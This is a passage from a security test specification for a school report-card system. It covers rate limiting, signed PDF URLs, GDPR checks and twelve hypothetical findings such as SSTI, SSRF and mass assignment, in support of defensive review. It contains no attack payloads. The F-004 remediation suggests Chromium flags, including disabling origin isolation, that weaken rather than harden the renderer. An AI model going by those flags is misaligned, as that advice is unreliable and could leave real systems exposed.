| 33.4 | Global rate limit            | All IPs combined 1M/s      | Infrastructure absorbs; fallback caches |                |           |
| 33.5 | IPv6 distribution bypass     | Many IPv6s per client      | /64 subnet aggregation                  |                |           |
| 33.6 | Cloudflare / WAF rule active | Check edge                 | Enabled                                 | P1 if disabled |           |
| 33.7 | Exponential backoff on fails | Progressive delay          | Optional; document                      |                |           |

### Section 34 — Short-lived signed URLs for PDF

| #    | Test Name                           | Payload / Scenario                 | Expected Result                              | Severity | Pass/Fail |
| ---- | ----------------------------------- | ---------------------------------- | -------------------------------------------- | -------- | --------- |
| 34.1 | PDF download URL TTL                | Generate → inspect `X-Amz-Expires` | ≤ 900s                                       |          |           |
| 34.2 | PDF download URL scope              | Key references single object       | Yes                                          |          |           |
| 34.3 | PDF download URL tampering          | Modify expiry                      | 403 SignatureDoesNotMatch                    |          |           |
| 34.4 | PDF download URL reuse after expiry | Wait 16 min, retry                 | 403                                          |          |           |
| 34.5 | PDF URL leaked to 3rd party         | Share URL externally               | Works within TTL (accepted risk); documented |          |           |

---

## Part 6 — Data Privacy / GDPR

### Section 35 — PII in URLs

| #    | Test Name                 | Payload / Scenario                                               | Expected Result                                              | Severity | Pass/Fail |
| ---- | ------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------ | -------- | --------- |
| 35.1 | Verification token in URL | `/verify/:token` — token itself is not PII but grants PII access | Documented in DPA                                            |          |           |
| 35.2 | Student ID in URL path    | `/v1/report-cards/:id` — ID is opaque UUID, not PII              | OK                                                           |          |           |
| 35.3 | Email in query string     | Any endpoint uses `?email=` in GET                               | None; emails in body only                                    |          |           |
| 35.4 | Browser history leak      | Inspect URLs stored in history                                   | No PII visible; only UUIDs                                   |          |           |
| 35.5 | Referrer leak             | Check Referrer header on outbound links from /verify             | Referrer-Policy strict-origin-when-cross-origin              |          |           |
| 35.6 | URL logged in proxy logs  | Tokens appear in CloudFront/ALB logs                             | Token is sensitive — treat logs as secret, encrypted at rest |          |           |

### Section 36 — PII in application logs

| #    | Test Name                              | Payload / Scenario                | Expected Result                                                  | Severity | Pass/Fail |
| ---- | -------------------------------------- | --------------------------------- | ---------------------------------------------------------------- | -------- | --------- |
| 36.1 | Comment text never logged at info      | Generate comment → grep info logs | Never present                                                    |          |           |
| 36.2 | snapshot_payload_json never logged     | Publish → grep logs               | Never present                                                    |          |           |
| 36.3 | Student name masked in error logs      | Force error; check logs           | Name replaced with hash or masked                                |          |           |
| 36.4 | Parent email never logged              | Email sent → grep                 | Present only in notifications queue (encrypted)                  |          |           |
| 36.5 | Phone numbers never logged             | SMS attempt → grep                | Masked (last 4 only)                                             |          |           |
| 36.6 | Full PDF content not logged            | Generate PDF → check stream logs  | Only metadata (size, key)                                        |          |           |
| 36.7 | JWT never logged in full               | Grep logs for JWT patterns        | Truncated (first 20 chars only) or absent                        |          |           |
| 36.8 | DB query parameters not logged at info | Check query logs                  | Info level: query shape; params only at debug (disabled in prod) |          |           |

### Section 37 — Data retention

| #    | Test Name                           | Payload / Scenario                                         | Expected Result                                       | Severity | Pass/Fail |
| ---- | ----------------------------------- | ---------------------------------------------------------- | ----------------------------------------------------- | -------- | --------- |
| 37.1 | Deleted report cards purged from S3 | Delete card → check S3                                     | Deleted within SLA (immediately OR lifecycle 30 days) |          |           |
| 37.2 | S3 lifecycle policy configured      | Inspect bucket                                             | Delete after retention window                         |          |           |
| 37.3 | Audit log retention ≥ 7 years       | Academic legal requirement                                 | Yes                                                   |          |           |
| 37.4 | Snapshot retention ≥ policy         | Snapshots retained per academic records policy             | Yes                                                   |          |           |
| 37.5 | Tombstone on deletion               | Deleted row preserves tenant_id + id + deleted_at in audit | Yes                                                   |          |           |
| 37.6 | Backups retention                   | 30-day point-in-time                                       | Yes                                                   |          |           |

### Section 38 — DSAR (Data Subject Access Request)

| #    | Test Name                               | Payload / Scenario         | Expected Result                                  | Severity | Pass/Fail |
| ---- | --------------------------------------- | -------------------------- | ------------------------------------------------ | -------- | --------- |
| 38.1 | Student report cards included in export | Trigger DSAR for student   | Full set exported in machine-readable (JSON/PDF) |          |           |
| 38.2 | Comments included                       | Same                       | Yes                                              |          |           |
| 38.3 | Acknowledgments included                | Same                       | Yes                                              |          |           |
| 38.4 | Attachments (PDFs) included             | Same                       | Yes                                              |          |           |
| 38.5 | Export time bound                       | SLA ≤ 30 days              | Yes                                              |          |           |
| 38.6 | Export format                           | JSON + PDF                 | Standardised                                     |          |           |
| 38.7 | Export authentication                   | Verified identity required | Yes                                              |          |           |

### Section 39 — Right to be forgotten

| #    | Test Name                                | Payload / Scenario                                             | Expected Result                                       | Severity | Pass/Fail |
| ---- | ---------------------------------------- | -------------------------------------------------------------- | ----------------------------------------------------- | -------- | --------- |
| 39.1 | Delete student → cascade to report cards | Delete → check cards                                           | Anonymised (names blanked) OR hard-deleted per policy |          |           |
| 39.2 | Snapshot anonymisation                   | PDF regeneration not possible after anonymisation — acceptable | Document trade-off                                    |          |           |
| 39.3 | Audit log entries preserved after forget | Still present with anonymised reference                        | Yes (legal basis)                                     |          |           |
| 39.4 | Forget within SLA                        | 30 days                                                        | Yes                                                   |          |           |
| 39.5 | Forget extends to backups                | Backup restore excludes forgotten subjects                     | Process documented                                    |          |           |

### Section 40 — Cross-border data transfer

| #    | Test Name                    | Payload / Scenario                                   | Expected Result                                  | Severity | Pass/Fail |
| ---- | ---------------------------- | ---------------------------------------------------- | ------------------------------------------------ | -------- | --------- |
| 40.1 | S3 region                    | EU-only / ME-only per tenant                         | Configurable                                     |          |           |
| 40.2 | DB region                    | Same                                                 | Configurable                                     |          |           |
| 40.3 | AI service region            | If OpenAI/Anthropic used, data flow to US?           | Documented in DPA; opt-in or region-pinned model |          |           |
| 40.4 | Email provider region        | SendGrid/SES region                                  | Configurable                                     |          |           |
| 40.5 | SCCs / DPA in place          | Legal                                                | Yes for each sub-processor                       |          |           |
| 40.6 | Data localisation per tenant | Saudi tenant: data in Saudi; UAE tenant: data in UAE | Regional sharding or policy                      |          |           |

---

## Part 7 — Observations & Severity Tally

### Section 41 — Pre-populated findings (hypothetical — confirm during execution)

These are plausible findings that must be confirmed or refuted by the execution team. If confirmed, they become the release-gating backlog.

| #     | Finding                                                                                                                     | Section       | Severity | Status | Recommendation                                                                                                                                                              |
| ----- | --------------------------------------------------------------------------------------------------------------------------- | ------------- | -------- | ------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| F-001 | Acknowledgment endpoint accepts `parent_id` in request body — tested in 1.7.1 / 27.1                                        | §1.7, §27     | **P0**   | Open   | Derive parent_id exclusively from JWT; strip body field via Zod strict schema                                                                                               |
| F-002 | Verification tokens have no explicit TTL — verification URLs are valid forever                                              | §31.1         | **P1**   | Open   | Introduce 1-year TTL or invalidate on student graduation; document policy                                                                                                   |
| F-003 | Rate limiting on `/v1/verify/:token` is either missing or too permissive — enumeration feasible                             | §1.6.5, §33   | **P1**   | Open   | Add 30 req/min per IP; add WAF challenge; log enumeration spikes                                                                                                            |
| F-004 | XSS in Puppeteer PDF render is not conclusively ruled out — script execution during render could reach AWS metadata service | §3.5.9, §10.1 | **P0**   | Open   | Launch Chromium with `--disable-web-security=false --disable-features=IsolateOrigins --js-flags="--jitless"`; block all network in headless; run on network-isolated worker |
| F-005 | Mass-assignment on PATCH endpoints not uniformly enforced — some schemas use `.passthrough()`                               | §23.10        | **P2**   | Open   | Audit every PATCH schema; require `.strict()` everywhere                                                                                                                    |
| F-006 | Cross-tenant revise chain — `revision_of_report_card_id` validation may not check tenant                                    | §4.6          | **P1**   | Open   | Add tenant_id equality assertion in RevisionService                                                                                                                         |
| F-007 | Principal signature images served from S3 without cache-control private — browser caches may persist                        | §2.12         | **P2**   | Open   | Pre-signed URLs with `response-cache-control=private,max-age=0`                                                                                                             |
| F-008 | SSTI payload in comment_text renders in Puppeteer context — Handlebars `{{...}}` may evaluate                               | §3.4.1        | **P0**   | Open   | Escape all user-generated content before template insertion; use `{{{unescaped}}}` never for user content                                                                   |
| F-009 | Audit log does not consistently record IP + UA for all 85 endpoints — some mutations skipped                                | §9.1          | **P2**   | Open   | AuditLogInterceptor: verify coverage with unit test per controller                                                                                                          |
| F-010 | JWT refresh rotation not enforced — refresh token reuse may be accepted                                                     | §7.2          | **P1**   | Open   | Implement refresh rotation with token family tracking; detect reuse                                                                                                         |
| F-011 | AI draft service endpoint configurable without deny-list — tenant admin could redirect internally (SSRF)                    | §10.5         | **P1**   | Open   | AI_BASE_URL is platform-level env only; never tenant-editable                                                                                                               |
| F-012 | Permission cache TTL exceeds 5 minutes — revoked permissions persist too long                                               | §14.1         | **P2**   | Open   | Reduce TTL to 60s; add immediate invalidation on revoke                                                                                                                     |

### Severity tally (pre-population)

- **P0 (block release):** F-001, F-004, F-008 — **3 items**
- **P1 (before first tenant onboarding):** F-002, F-003, F-006, F-010, F-011 — **5 items**
- **P2 (next sprint):** F-005, F-007, F-009, F-012 — **4 items**
- **P3 (backlog):** 0 pre-populated — to be added during execution

**Total pre-populated: 12 findings.**

### OWASP Top 10 (2021) coverage confirmation

| Category                                     | Section | Covered                        |
| -------------------------------------------- | ------- | ------------------------------ |
| A01 Broken Access Control                    | §1      | YES (7 sub-sections, 47 tests) |
| A02 Cryptographic Failures                   | §2      | YES (16 tests)                 |
| A03 Injection                                | §3      | YES (6 sub-sections, 59 tests) |
| A04 Insecure Design                          | §4      | YES (15 tests)                 |
| A05 Security Misconfiguration                | §5      | YES (20 tests)                 |
| A06 Vulnerable & Outdated Components         | §6      | YES (14 tests)                 |
| A07 Identification & Authentication Failures | §7      | YES (10 tests)                 |
| A08 Software & Data Integrity Failures       | §8      | YES (10 tests)                 |
| A09 Security Logging & Monitoring Failures   | §9      | YES (12 tests)                 |
| A10 SSRF                                     | §10     | YES (10 tests)                 |

All 10 categories of OWASP Top 10 (2021) are explicitly covered.

### Section 42 — Sign-off

This specification is complete when:

1. Every test in Sections 1–40 has a Pass/Fail recorded during execution.
2. Every pre-populated finding (F-001 to F-012) has been confirmed or refuted.
3. Every confirmed P0 finding has a remediation PR merged and re-tested.
4. Every confirmed P1 finding has a tracked backlog entry with owner + due date before first tenant onboarding.
5. The penetration-testing firm or internal security engineer has signed a summary attestation document.

Signed-off by: ********\_\_\_\_******** Date: ****\_\_\_\_****
Role: Security Lead / External Pentester Reviewer: ********\_\_\_\_********

---

**End of specification.**
